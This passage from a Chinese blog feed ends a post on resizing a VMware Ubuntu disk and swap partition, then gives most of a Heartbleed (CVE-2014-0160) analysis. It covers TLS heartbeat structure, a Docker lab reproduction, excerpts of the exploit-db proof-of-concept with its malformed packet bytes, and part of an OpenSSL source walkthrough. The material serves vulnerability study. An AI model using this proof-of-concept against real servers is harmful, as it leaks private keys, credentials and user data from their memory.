class="line">Disk identifier: 0xbaa4ad2e</div><div class="line"></div><div class="line">Device     Boot    Start      End  Sectors Size Id Type</div><div class="line">/dev/sda1           2048 75501568 75499521  36G 83 Linux</div><div class="line">/dev/sda2       75503616 83886079  8382464   4G 83 Linux</div></pre></td></tr></table></figure></p>
<p>到此，新建的 2 个分区的大小已经设置好了，还需要设置 ID，将 /dev/sda2 设置为 Linux swap 。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): t</div><div class="line">Partition number (1,2, default 2): 2</div><div class="line">Partition <span class="built_in">type</span> (<span class="built_in">type</span> L to list all types): 82</div><div class="line"></div><div class="line">Changed <span class="built_in">type</span> of partition <span class="string">'Linux'</span> to <span class="string">'Linux swap / Solaris'</span>.</div></pre></td></tr></table></figure></p>
<p>最后使用 w 保存。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w</div><div class="line">The partition table has been altered.</div><div class="line">Calling ioctl() to re-read partition table.</div><div class="line">Re-reading the partition table failed.: Device or resource busy</div><div class="line"></div><div class="line">The kernel still uses the old table. The new table will be used at the next reboot or after you run partprobe(8) or kpartx(8).</div></pre></td></tr></table></figure></p>
<p>重启虚拟机，并设置交换分区的 UUID。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">ubuntu<span class="comment"># awk '/swap/ &#123; print $1&#125;' /etc/fstab</span></div><div class="line"><span class="comment">#</span></div><div class="line">UUID=a3e89d30-b6b8-4131-9c0c-0c686a7ae1f7</div><div class="line"></div><div class="line">ubuntu<span class="comment"># dd if=/dev/zero of=/dev/sda2 </span></div><div class="line">dd: writing to <span class="string">'/dev/sda2'</span>: No space left on device</div><div class="line">8382465+0 records <span class="keyword">in</span></div><div class="line">8382464+0 records out</div><div class="line">4291821568 bytes (4.3 GB, 4.0 GiB) copied, 159.644 s, 26.9 MB/s</div><div class="line">ubuntu<span class="comment"># mkswap -U a3e89d30-b6b8-4131-9c0c-0c686a7ae1f7 /dev/sda2</span></div><div class="line">Setting up swapspace version 1, size = 4 GiB (4291817472 bytes)</div><div class="line">no label, UUID=a3e89d30-b6b8-4131-9c0c-0c686a7ae1f7</div><div class="line">ubuntu<span class="comment"># swapon -a</span></div><div class="line">ubuntu<span class="comment"># free -m</span></div><div class="line">              total        used        free      shared  buff/cache   available</div><div class="line">Mem:           3921         635        2766          11         519        2952</div><div class="line">Swap:          4092           0        4092</div><div class="line"></div><div class="line">ubuntu<span class="comment"># resize2fs /dev/sda1</span></div><div class="line">resize2fs 1.42.13 (17-May-2015)</div><div class="line">Filesystem at /dev/sda1 is mounted on /; on-line resizing required</div><div class="line">old_desc_blocks = 1, new_desc_blocks = 3</div><div class="line">The filesystem on /dev/sda1 is now 9437440 (4k) blocks long.</div><div class="line"></div><div class="line">ubuntu<span class="comment"># df -h</span></div><div class="line">Filesystem      Size  Used Avail Use% Mounted on</div><div class="line">udev            1.9G     0  1.9G   0% /dev</div><div class="line">tmpfs           393M  6.2M  387M   2% /run</div><div class="line">/dev/sda1        36G   12G   23G  35% /</div><div class="line">tmpfs           2.0G  216K  2.0G   1% /dev/shm</div><div class="line">tmpfs           5.0M  4.0K  5.0M   1% /run/lock</div><div class="line">tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup</div><div class="line">tmpfs           393M   72K  393M   1% /run/user/1000</div></pre></td></tr></table></figure></p>
<p>到此已经完成所有配置，可以看到 /dev/sda1 的容量已经调整到 36G。</p>
<hr>
<p>References:<br>[1] <a href="https://blog.csdn.net/openrd/article/details/51405884" target="_blank" rel="external">VMware下ubuntu扩展磁盘空间</a>   </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 磁盘空间 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Heartbleed 漏洞分析]]></title>
      <url>/2018/0701/heartbleed-vulnerability-analysis/</url>
      <content type="html"><![CDATA[<h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h1><h2 id="1-SSL协议简介"><a href="#1-SSL协议简介" class="headerlink" title="1. SSL协议简介"></a>1. SSL协议简介</h2><p>SSL 全称 Secure Sockets Layer（安全套接字层协议），要求建立在可靠的传输层协议（TCP）之上，主要提供机密性、认证性及数据完整性服务。SSL 最初（SSL 1.0、SSL2.0、SSL 3.0 版本）由网景公司设计和维护，从 3.1 版本开始，SSL 协议由因特网工程任务小组（IETF）正式接管，并更名为 TLS（传输层安全协议，Transport Layer Security），发展至今已有 TLS 1.0、TLS1.1、TLS1.2 三个版本。<br>SSL/TLS 协议能够提供的安全服务主要包括：</p>
<ul>
<li>认证性——使用数字证书认证服务器和客户端身份，防止身份伪造；</li>
<li>机密性——使用加密算法防止第三方窃听；</li>
<li>完整性——使用消息认证码（MAC）保障数据完整性，防止消息被篡改；</li>
<li>重放保护——通过使用隐式序列号防止重放攻击。<br>SSL/TLS 协议有一个高度模块化的架构，可分为两层：SSL 记录协议为上层协议提供数据封装、压缩、消息认证和完整性保护、加密等安全服务；SSL 上层协议使用 SSL 记录协议提供的服务完成 SSL 通信过程，上层协议包括以下几个子协议：<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-30/10954248.jpg" alt=""><br><strong>SSL 握手协议</strong>：提供建立安全通道的服务，用于协商安全参数和密码套件、服务器身份认证、客户端身份认证（可选）、密钥生成；<br><strong>SSL 修改密文协议</strong>：用于更新当前使用的加密套件。在服务器和客户端间互相通告将启用新的密码规范，使得双方实现同步；<br><strong>SSL 报警协议</strong>：传递握手过程中产生的的错误，分为 fatal 和 warning 两个级别，fatal 类型的错误会直接中断 SSL 链接，而 warning 级别的错误 SSL 链接仍可继续，只是会给出错误警告。</li>
</ul>
<h2 id="2-SSL握手过程"><a href="#2-SSL握手过程" class="headerlink" title="2. SSL握手过程"></a>2. SSL握手过程</h2><p>SSL 安全协议中，服务器和客户端间的通信可分为握手阶段和传输阶段。其中，握手阶段需要 2 次握手完成。SSL 的通信过程如下图所示，步骤 1 和步骤 2 完成第一次握手过程，协商通信双方使用的加密方式。同时，客户端获取服务器的数字证书；步骤 3 和步骤 4 完成第二次握手过程，协商后续数据传输所使用的对称加密密钥。至此，SSL 连接建立完成。步骤 5，双方通过 SSL 协议建立的安全通道进行加密传输。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-30/1996222.jpg" alt="">  </p>
<h2 id="3-SSL“心跳”机制"><a href="#3-SSL“心跳”机制" class="headerlink" title="3. SSL“心跳”机制"></a>3. SSL“心跳”机制</h2><p>SSL 协议完成握手过程后，客户端和服务器间便建立安全可靠的通信。SSL 安全协议工作在传输层的 TCP 协议之上，所以服务器和客户端需要保持持续连接的状态。由于服务器的资源有限，当连接的客户端数量较大时，服务器要维持这些连接将会消耗很多资源，因此需要及时断开完成通信的客户端以减少服务器的负载压力。服务器通过 SSL 的心跳机制可判断客户端是否已完成通信。</p>
<p>RFC6520 文件中规定，SSL 协议中的心跳机制工作于 SSL 记录协议之上，心跳机制中包含两种类型的消息：心跳请求消息（HeartbeatRequest Message）和心跳响应消息（HeartbeatResponse Message），这两种消息具有相同的包结构。当服务器和客户端完成 SSL 协议的握手阶段后，如果客户端一段时间没有与服务器进行数据交互，客户端需要周期性地向服务器发送心跳请求消息。服务器接收到客户端的心跳请求消息，则认为客户端还没有完成通信，继续维持客户端和服务器的连接，并向客户端发送心跳响应消息。</p>
<p>通信双方在建立 SSL 连接时可协商是否支持心跳机制。在 SSL 第一次握手过程中通过 Client Hello 消息和 Server Hello 消息的 Heartbeat Hello 扩展告知对方是否支持心跳机制。Heartbeat Hello 扩展的格式如下。当支持心跳机制时设置 HeartbeatMode 为 peer_allowed_to_send，可接收心跳请求消息并能返回响应包；当不支持心跳机制时设置 HeartbeatMode 为 peer_not_allowed_to_send，若对端发送心跳请求消息，将会丢弃该消息并返回 unexpected_message 警告消息。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">enum</span> &#123;</div><div class="line">    peer_allowed_to_send(<span class="number">1</span>),</div><div class="line">    peer_not_allowed_to_send(<span class="number">2</span>),</div><div class="line">&#125; HeartbeatMode;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">    HeartbeatMode mode;</div><div class="line">&#125; HeartbeatExtension;</div></pre></td></tr></table></figure></p>
<p>心跳包的结构如下图所示，前半部分为 SSL 记录头，Content Type 为消息类型（0x18 表示心跳包消息），TLS Version 为 SSL 版本信息，Record length 为记录长度；后半部分即为心跳消息。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-30/64534789.jpg" alt=""><br>其中，SSL 记录长度（Record length）为心跳消息的总长度。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Record length = <span class="number">1</span> bytes(Heartbeat Type) + <span class="number">2</span> bytes(Payload length) + payload length(Payload) + <span class="number">16</span> bytes(Padding)</div></pre></td></tr></table></figure></p>
<p>心跳包消息由数据包类型（type）、载荷长度（payload length）、载荷内容（payload）和填充字节（padding）组成。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">      HeartbeatMessageType type;    <span class="comment">// 1 bytes，包括request 和 response两种类型</span></div><div class="line">      uint16 payload_length;    <span class="comment">// 2 bytes，载荷长度</span></div><div class="line">      opaque payload[HeartbeatMessage.payload_length];    <span class="comment">// payload_length bytes，载荷内容</span></div><div class="line">      opaque padding[padding_length];    <span class="comment">// 填充字节，至少为16 bytes</span></div><div class="line">&#125; HeartbeatMessage;</div></pre></td></tr></table></figure></p>
<p>下图为心跳请求包的数据包实例，其载荷长度为 5 bytes。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-30/91460635.jpg" alt="">  </p>
<h2 id="4-OpenSSL"><a href="#4-OpenSSL" class="headerlink" title="4. OpenSSL"></a>4. OpenSSL</h2><p>OpenSSL 是一个强大的安全套接字层密码开源库，包括主要的密码算法、常用的密钥和证书封装管理功能及 SSL 协议，并提供丰富的应用程序供测试使用。大多数通过 SSL/TLS 协议加密的网站都使用了 OpenSSL 开源软件包。当 OpenSSL 被爆出安全漏洞时，将会影响所有使用 OpenSSL 开源包的应用。<br>从结构上看，OpenSSL 分为三层，底层为各种密码算法的实现，中间层是密码算法的抽象接口，顶层是围绕加密算法的 PKCS 的实现，以及 ASN.1 的 DER、BER 编码接口，让这些抽象数据结构最终成为能够在网上传输、在硬盘上存储的数据。</p>
<h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1. 漏洞信息"></a>1. 漏洞信息</h2><blockquote>
<p>漏洞编号：CVE-2014-0160<br>漏洞类型：内存越界访问<br>漏洞危害：信息泄露<br>影响范围：OpenSSL1.0.1、OpenSSL 1.0.1a~ OpenSSL 1.0.1f、OpenSSL 1.0.2-beta<br>漏洞描述：OpenSSL 在实现 TLS（传输层安全协议）和 DTLS（数据报安全传输协议）的心跳包处理逻辑时存在问题。OpenSSL 的 Heartbleed 模块在处理心跳包时没有检查心跳包中的长度字段是否与后续的数据字段一致，攻击者利用该漏洞构造异常数据包，可获取服务器内存中多达 64KB 的数据。这些数据可能会包含证书私钥、用户账号、密码、邮件内容等敏感信息。</p>
</blockquote>
<h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h2><h3 id="1）环境"><a href="#1）环境" class="headerlink" title="1）环境"></a>1）环境</h3><p>首先需要搭建漏洞测试环境，为节省时间，可以直接使用 Docker Hub 中的测试环境。用以下命令可拉取（pull）已部署漏洞环境的测试镜像。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull hmlio/vaas-cve-2014-0160</div></pre></td></tr></table></figure></p>
<p>该镜像中所部署的服务如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">System：Debian GNU/Linux 7 (wheezy)</div><div class="line">Http Server：Apache/2.2.22</div><div class="line">OpenSSL：openssl-1.0.1e</div></pre></td></tr></table></figure></p>
<p>接着运行容器，并使用 -p 参数把容器中 443 端口映射到宿主机的 8443 端口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run <span class="_">-d</span> -p 8443:443 hmlio/vaas-cve-2014-0160</div></pre></td></tr></table></figure></p>
<p>最后在宿主机中用浏览器访问 <code>https://127.0.0.1:8443</code>，若服务正常，将返回以下页面。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-30/37260673.jpg" alt="">  </p>
<h3 id="2）测试"><a href="#2）测试" class="headerlink" title="2）测试"></a>2）测试</h3><p>从 exploit-db 下载 <a href="https://www.exploit-db.com/exploits/32745/" target="_blank" rel="external">POC</a> 对 HTTP 服务器进行测试，并用 tcpdump 捕获攻击过程中通信双方交互的数据。可修改 POC 中畸形心跳请求包的构造方式，原畸形包没有载荷 (payload) 和填充字符 (padding)；修改后的畸形包有完整的包结构。两种构造方式都能成功利用漏洞。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">### 构造畸形心跳请求包。</span></div><div class="line"><span class="comment"># 原构造方式：</span></div><div class="line"><span class="comment"># 0x18:Heartbleed消息类型; 0x0302:TLS1.1; 0x0003:心跳包长度</span></div><div class="line"><span class="comment"># 0x01:Heartbleed request类型; 0x4000:payload长度</span></div><div class="line"><span class="comment"># hb = h2bin('18 03 02 00 03 01 40 00')</span></div><div class="line"></div><div class="line"><span class="comment"># 修改后的构造方式：</span></div><div class="line"><span class="comment"># 0x18:Heartbleed消息类型; 0x0302:TLS1.1; 0x0008:心跳包长度; </span></div><div class="line"><span class="comment"># 0x01:Heartbleed request类型; 0x0155:payload长度; </span></div><div class="line"><span class="comment"># 5*' 41':载荷数据; 16*' 42':填充字节</span></div><div class="line">hb = h2bin(<span class="string">'18 03 02'</span>+<span class="string">' 00 08'</span>+<span class="string">' 01'</span>+<span class="string">' 01 55'</span>+<span class="number">5</span>*<span class="string">' 41'</span>+<span class="number">16</span>*<span class="string">' 42'</span>)</div></pre></td></tr></table></figure></p>
<p>首先使用以下命令运行 tcpdump 监听网络接口，由于 HTTP 服务器部署在 docker 中，需用-i 选项指定网络接口为 docker0，同时用-w 选项把数据包存入 heartbleed.pcap 文件中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo tcpdump -i docker0 -w heartbleed.pcap</div></pre></td></tr></table></figure></p>
<p>接着运行 POC（已做部分修改）发送攻击数据包进行测试。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python exploit.py -p 8443 127.0.0.1</div></pre></td></tr></table></figure></p>
<p>测试结果如下图所示，利用漏洞已成功获取服务器内存中数据，返回的数据中包含了客户端发送的 HTTP 请求头信息。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/55912321.jpg" alt=""><br>使用 Wireshark 打开数据包文件 heartbleed.pcap，筛选出 SSL 通信数据包有以下 4 个。前 2 个为 SSL 协议握手过程的第一阶段。第 3 个为客户端发送的畸形心跳请求包，该请求包中载荷长度（payload length）为 341 bytes，但是实际载荷内容（payload）的长度为 5 bytes。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/67904758.jpg" alt=""><br>第 4 个为服务器返回的心跳响应包，由于服务器收到畸形心跳请求包后，在构造心跳响应包时未对载荷长度进行检查，将内存中其它数据与心跳数据（总长度为 341 bytes）一起返回给客户端，导致服务器内存泄露，从下图可看到泄露的服务器内存数据中包含有客户端发送的 HTTP 请求头信息。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/38937640.jpg" alt="">  </p>
<h1 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h1><p>Heartleed 漏洞攻击过程如下图所示，客户端向服务器发送心跳载荷长度（payload length）大于实际心跳载荷（payload）长度的心跳请求包，服务器会将内存中的额外数据返回给客户端，可能导致敏感信息泄露。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/16554705.jpg" alt="">  </p>
<h2 id="1-POC-分析"><a href="#1-POC-分析" class="headerlink" title="1. POC 分析"></a>1. POC 分析</h2><p>通过分析 POC 可知， main 函数中首先与服务器建立 socket 连接；接着发送 SSL Client Hello 进行第一次握手，Client Hello 的 Heartbeat Hello 扩展中 Mode 字段为 peer_allowed_to_send 表明客户端支持心跳机制。若服务器返回 Server Hello Done 则表明已完成第一次握手过程；最后发送畸形心跳请求包即可触发漏洞。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    opts, args = options.parse_args()</div><div class="line">    <span class="keyword">if</span> len(args) &lt; <span class="number">1</span>:</div><div class="line">        options.print_help()</div><div class="line">        <span class="keyword">return</span></div><div class="line">    <span class="comment"># 与服务器建立socket连接</span></div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    <span class="keyword">print</span> <span class="string">'Connecting...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    s.connect((args[<span class="number">0</span>], opts.port))</div><div class="line">    <span class="comment"># 发送 Client Hello 握手包</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'Sending Client Hello...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    s.send(hello)</div><div class="line">    <span class="comment"># 等待服务器返回 Server Hello 握手包</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'Waiting for Server Hello...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        typ, ver, pay = recvmsg(s)</div><div class="line">        <span class="comment"># 服务器未返回 Server Hello 握手包，SSL 第一次握手失败</span></div><div class="line">        <span class="keyword">if</span> typ == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'Server closed connection without sending Server Hello.'</span></div><div class="line">            <span class="keyword">return</span></div><div class="line">        <span class="comment"># 若接收到 Server Hello Done 消息则 break</span></div><div class="line">        <span class="comment"># 其中，22表示握手包，0x0E表示握手包类型为 Server Hello Done</span></div><div class="line">        <span class="keyword">if</span> typ == <span class="number">22</span> <span class="keyword">and</span> ord(pay[<span class="number">0</span>]) == <span class="number">0x0E</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="comment"># 发送畸形心跳请求包</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'Sending heartbeat request...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    hit_hb(s)</div></pre></td></tr></table></figure></p>
<p>POC 中构造的畸形心跳请求包如下图所示，其中载荷长度（0x0155）大于实际载荷数据长度（0x05）。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 构造心跳请求包。</span></div><div class="line"><span class="comment"># 0x18:Heartbleed 消息类型; 0x0302:TLS1.1; 0x0008:心跳包长度; 0x01:Heartbleed request 类型;</span></div><div class="line"><span class="comment"># 0x0155:payload 长度; 5*' 41':载荷数据; 16*' 42':填充字节</span></div><div class="line">hb = h2bin(<span class="string">'18 03 02'</span>+<span class="string">' 00 08'</span>+<span class="string">' 01'</span>+<span class="string">' 01 55'</span>+<span class="number">5</span>*<span class="string">' 41'</span>+<span class="number">16</span>*<span class="string">' 42'</span>)</div></pre></td></tr></table></figure></p>
<p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/95471870.jpg" alt=""><br>hit_hb() 函数向服务器发送畸形心跳请求包，正常情况下服务器应返回的心跳响应包长度为 24 bytes。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Heartbeat response length = <span class="number">1</span> bytes(Heartbeat Type) + <span class="number">2</span> bytes(Payload length) + <span class="number">5</span> bytes(payload length)</div><div class="line">+ <span class="number">16</span> bytes(Padding) = <span class="number">24</span> bytes</div></pre></td></tr></table></figure></p>
<p>若服务器返回长度大于 24 bytes 的心跳响应包，则表明服务器存在该漏洞；若服务器没有返回心跳响应包，而是只返回类型值为 21 的警告包，则表明服务器不存在该漏洞。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hit_hb</span><span class="params">(s)</span>:</span></div><div class="line">    s.send(hb)    <span class="comment"># 发送心跳请求包</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        typ, ver, pay = recvmsg(s)    <span class="comment"># 接收响应包</span></div><div class="line">        <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'No heartbeat response received, server likely not vulnerable'</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"> </div><div class="line">        <span class="keyword">if</span> typ == <span class="number">24</span>:    <span class="comment"># 若为心跳包，则输出载荷数据</span></div><div class="line">            <span class="keyword">print</span> <span class="string">'Received heartbeat response:'</span></div><div class="line">            hexdump(pay)</div><div class="line">            <span class="keyword">if</span> len(pay) &gt; <span class="number">24</span>:    <span class="comment"># 若心跳包总长度大于24，则表明服务器有漏洞</span></div><div class="line">                <span class="keyword">print</span> <span class="string">'WARNING: server returned more data than it should - server is vulnerable!'</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'Server processed malformed heartbeat, but did not return any extra data.'</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"> </div><div class="line">        <span class="keyword">if</span> typ == <span class="number">21</span>:     <span class="comment"># 若为警告包，则表明服务器没有漏洞</span></div><div class="line">            <span class="keyword">print</span> <span class="string">'Received alert:'</span></div><div class="line">            hexdump(pay)</div><div class="line">            <span class="keyword">print</span> <span class="string">'Server returned error, likely not vulnerable'</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure></p>
<h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2. 漏洞原理"></a>2. 漏洞原理</h2><p>OpenSSL 是 SSL 协议实现的开源软件包，存在漏洞的两个文件为 ssl/d1_both.c 和 ssl/t1_lib.c，这两个文件中的 dtls1_process_heartbeat() 和 tls1_process_heartbeat() 分别为 DTLS（数据报安全传输协议）和 TLS（传输层安全协议）处理心跳请求包的函数。</p>
<h3 id="1）解析心跳请求包"><a href="#1）解析心跳请求包" class="headerlink" title="1）解析心跳请求包"></a>1）解析心跳请求包</h3><p>dtls1_process_heartbeat() 函数和 tls1_process_heartbeat() 函数的代码完全相同，下面对 openssl-1.0.1e 源码包中的 dtls1_process_heartbeat() 函数进行分析。dtls1_process_heartbeat() 函数首先解析客户端所发的心跳请求包，代码中将&amp;s-&gt;s3-&gt;rrec.data[0] 的值赋给指针 p。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// p 指向 SSL3 记录数据，即心跳消息</span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *p = &amp;s-&gt;s3-&gt;rrec.data[<span class="number">0</span>], *pl;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> hbtype;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> payload;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> padding = <span class="number">16</span>; <span class="comment">/* Use minimum padding */</span></div></pre></td></tr></table></figure></p>
<p>为找到 s-&gt;s3-&gt;rrec.data[0] 的定义，通过依次寻找 <code>SSL/ ssl_st/s3/ssl3_state_st/rrec/ SSL3_RECORD</code> 的顺序，最终找到 SSL 记录结构体 SSL3_RECORD 的定义。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* crypto/ossl_tpy.h */</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ssl_st</span> <span class="title">SSL</span>;</span></div><div class="line"></div><div class="line"><span class="comment">/* ssl/ssl.h */</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ssl_st</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ssl2_state_st</span> *<span class="title">s2</span>;</span> <span class="comment">/* SSLv2 variables */</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ssl3_state_st</span> *<span class="title">s3</span>;</span> <span class="comment">/* SSLv3 variables */</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dtls1_state_st</span> *<span class="title">d1</span>;</span> <span class="comment">/* DTLSv1 variables */</span></div><div class="line">	...</div><div class="line">&#125;</div><div class="line"><span class="comment">/* ssl/ssl3.h */</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ssl3_state_st</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	SSL3_RECORD rrec;	<span class="comment">/* each decoded record goes in here */</span></div><div class="line">	...</div><div class="line">&#125;</div><div class="line"><span class="comment">/* ssl/ssl3.h */</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ssl3_record_st</span></span></div><div class="line">&#123;</div><div class="line"><span class="comment">/*r */</span>	<span class="keyword">int</span> type;               <span class="comment">/* type of record */</span></div><div class="line"><span class="comment">/*rw*/</span>	<span class="keyword">unsigned</span> <span class="keyword">int</span> length;      <span class="comment">/* How many bytes available */</span></div><div class="line"><span class="comment">/*r */</span>	<span class="keyword">unsigned</span> <span class="keyword">int</span> off;         <span class="comment">/* read/write offset into 'buf' */</span></div><div class="line"><span class="comment">/*rw*/</span>	<span class="keyword">unsigned</span> <span class="keyword">char</span> *data;      <span class="comment">/* pointer to the record data */</span></div><div class="line"><span 